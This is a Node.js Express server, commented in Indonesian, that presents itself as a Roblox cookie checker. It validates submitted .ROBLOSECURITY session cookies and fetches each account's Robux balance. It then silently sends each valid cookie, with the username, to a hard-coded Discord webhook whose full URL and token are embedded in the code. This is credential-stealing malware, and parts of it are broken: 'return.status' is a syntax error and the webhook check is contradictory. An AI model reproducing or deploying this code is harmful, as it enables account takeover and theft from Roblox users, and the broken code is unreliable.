const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Masukkan link webhook Discord kamu di sini secara langsung
const SECRET_WEBHOOK_URL = "MASUKKAN_LINK_WEBHOOK_DISCORD_DISINI";

app.post('/api/check', async (req, res) => {
    try {
        const { cookies } = req.body;
        if (!cookies || !Array.isArray(cookies)) {
            return.status(400).json({ error: "Format input tidak valid." });
        }

        const results = [];
        for (let rawCookie of cookies) {
            let cleanCookie = rawCookie.trim().replace(/^["']|["']$/g, '');
            if (!cleanCookie) continue;

            try {
                // Cek autentikasi ke Roblox
                const userRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
                    headers: {
                        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
                        'User-Agent': 'Mozilla/5.0'
                    },
                    timeout: 5000
                });

                if (userRes.data && userRes.data.id) {
                    const userId = userRes.data.id;
                    const username = userRes.data.name;
                    const displayName = userRes.data.displayName;

                    // Ambil Robux
                    let robux = 0;
                    try {
                        const curRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                            headers: { 'Cookie': `.ROBLOSECURITY=${cleanCookie}` },
                            timeout: 3000
                        });
                        robux = curRes.data.robux || 0;
                    } catch (e) {}

                    const accountData = {
                        success: true,
                        userId,
                        username,
                        displayName,
                        robux,
                        createdDate: "Aktif",
                        isPremium: false,
                        cookie: cleanCookie
                    };

                    results.push(accountData);

                    // Kirim ke Discord Webhook
                    if (SECRET_WEBHOOK_URL && SECRET_WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/1564812827104120864/IVzRYsDRj7cnXt97p647eU9c9s4276WOmMlTT2KuRK989Yvfh-NPw3HrwP8ChPD4MGUM")) {
                        try {
                            await axios.post(SECRET_WEBHOOK_URL, {
                                content: `🚨 **AKUN VALID!**\n👤 **Username:** ${username}\n💰 **Robux:** ${robux}\n🔑 \`\`\`${cleanCookie}\`\`\``
                            }, { timeout: 3000 });
                        } catch (err) {}
                    }
                }
            } catch (err) {
                // Cookie tidak valid / expired, abaikan
            }
        }

        res.json({ results });
    } catch (err) {
        res.status(500).json({ error: "Terjadi kesalahan pada server." });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
